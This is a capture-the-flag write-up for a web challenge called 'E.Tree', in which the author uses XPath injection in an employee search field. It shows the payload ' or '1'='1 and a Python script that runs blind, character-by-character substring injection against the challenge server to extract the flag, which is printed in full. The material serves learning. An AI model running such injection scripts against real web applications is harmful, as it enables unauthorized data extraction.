# E.Tree

Challenge text:
```
After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?
```
Along with an [XML file](military.xml) (but with all fields redacted).

The website had a search field where you could search for the name of military members, to see if they existed. I tried writing some different names, but only got `This millitary staff member doesn't exist.`

I assumed that the redacted XML file was what the website searched in, and after a bit of looking around I learnt of [XPATH injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection). I tested the payload `' or '1'='1`, and got the response `This millitary staff member exists.`. 

As I don't believe that there was a way for me to get any output, I had to do blind injection. As I had the format of the XML file, I knew the flag was split into the 2 locations; `//military/district[position()=2]/staff[position()=3]/selfDestructCode` and `//military/district[position()=3]/staff[position()=2]/selfDestructCode`. 

Similar to substring blind SQLi, we could give the input `' or substring((//military/district[position()=3]/staff[position()=2]/selfDestructCode),<position>,1)='<character>` to check if a character is in a position or not, we could then enumerate over every position and character to extract the data in the fields.

I wrote a Python script to do this.
```py
import json
import requests

final = ""

for x in range(len(final)+1, 100):
    for c in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if c == 0x7f:
            print("done!")
            __import__("sys").exit()
        c = chr(c)

        # the flag was split into 2 locations, so i ran the script twice
        # injection = f"' or substring((//military/district[position()=2]/staff[position()=3]/selfDestructCode),{x},1)='{c}" # part 1
        injection = f"' or substring((//military/district[position()=3]/staff[position()=2]/selfDestructCode),{x},1)='{c}" # part 2
        res = requests.post("http://178.62.14.240:30683/api/search", json={"search": injection}).text
        try:
            j = json.loads(res)
        except:
            continue
        if j["message"] == "This millitary staff member exists.": # if we get a success, we know that the character we just sent in is correct for the position
            final += c
            print(final)
            break
```

This slowly but surely gave us the flag.
```
...

CHTB{Th3_3xTr4_l3v3l_4Cc3s$_
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0n
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nT
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
```